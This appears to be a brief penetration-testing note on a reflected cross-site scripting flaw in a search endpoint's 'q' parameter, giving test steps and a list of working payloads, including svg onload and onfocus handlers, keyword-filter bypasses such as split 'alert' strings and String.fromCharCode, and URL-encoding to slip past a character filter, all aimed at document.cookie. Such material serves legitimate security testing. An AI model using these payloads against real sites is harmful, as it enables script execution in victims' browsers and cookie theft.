## Use case

The vulnerability was found in a search endpoint where user input was reflected in the response, allowing for the execution of arbitrary JavaScript due to inadequate filtering mechanisms.

## Steps to test

1. Inject a marker string, `"insertTEST`, into the `q` parameter to confirm reflection and encoding.
2. Test standard payloads for attribute-context injection, such as `"><svg onload=confirm(document.cookie)>`.
3. Identify the keyword filter by testing mixed-case variations of `alert` to confirm they are not stripped.
4. Test for character filtering by attempting to use the plus sign in a payload, such as `+autofocus+Onfocus="window['al'+'ert'](document.cookie)"+y="`.
5. Bypass the character filter by URL-encoding the plus sign as `%2b` in the payload.
6. Confirm execution by checking if the payload triggers JavaScript in the browser.

## Commands

```text
q="insertTEST"
q="><svg onload=confirm(document.cookie)>
q="tabindex=1 onfocus=alert(document.cookie)"
q="+autofocus+Onfocus=window['al'+'ert'](document.cookie)+y="
q="+autofocus+Onfocus=window['al'%2b'ert'](document.cookie)+y="
q="Onfocus=self[String.fromCharCode(97,108,101,114,116)](document.domain)"
"><svg onload=confirm(document.cookie)>
"tabindex="1" onfocus="alert(document.cookie)" id="a1"#a1
```
